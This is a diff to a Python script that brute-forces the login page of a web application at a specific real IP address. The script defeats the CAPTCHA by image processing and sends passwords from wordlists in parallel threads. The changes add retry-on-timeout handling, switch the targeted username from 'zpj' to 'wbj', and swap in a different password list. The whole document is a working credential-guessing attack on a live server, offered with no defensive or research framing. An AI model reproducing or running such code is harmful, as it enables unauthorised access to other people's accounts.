@@ -8,10 +8,13 @@ import io
 
 def process_thread(passwd):
     session = requests.Session()
-    response = session.get('http://222.91.162.190:81/XtLogin.aspx')
-    captcha = session.get('http://222.91.162.190:81/CodeValidate.aspx?Type=Sample&Temp=636362801637913750')
-    # with open(img_file_name, 'wb+') as img:
-    #     img.write(captcha.content)
+    try:
+        response = session.get('http://222.91.162.190:81/XtLogin.aspx')
+        captcha = session.get('http://222.91.162.190:81/CodeValidate.aspx?Type=Sample&Temp=636362801637913750')
+    except:
+        print('connection timeout current passwd: ' + passwd)
+        time.sleep(60)
+        process_thread(passwd)
 
     img = Image.open(io.BytesIO(captcha.content))
     img = img.convert('L') #转换为灰度图片
@@ -27,7 +30,7 @@ def process_thread(passwd):
         '__EVENTARGUMENT': '',
         '__VIEWSTATE': '',
         '__VIEWSTATEGENERATOR': '',
-        'TextBox1': 'zpj',
+        'TextBox1': 'wbj',
         'TextBox2': passwd,
         'Validate1$Validate': captcha_code,
         'Button1': '登录'
@@ -48,17 +51,18 @@ def process_thread(passwd):
         f.close()
         exit()
 
+
 if __name__ == '__main__':
     start =time.time()
-    password_file = open('zpj-6-nums.list')
+    password_file = open('after-4-alph-0603.list')
+    # password_file.seek(50000)
     threads = Pool(8)
-    # password_file.seek(80000)
     line = password_file.readline()
     while line:
         passwd = line.strip('\n')
         threads.apply_async(process_thread, args=(passwd,))
+        # process_thread(passwd)
         line = password_file.readline()
-    # process_thread(line)
 
     threads.close()
     threads.join()
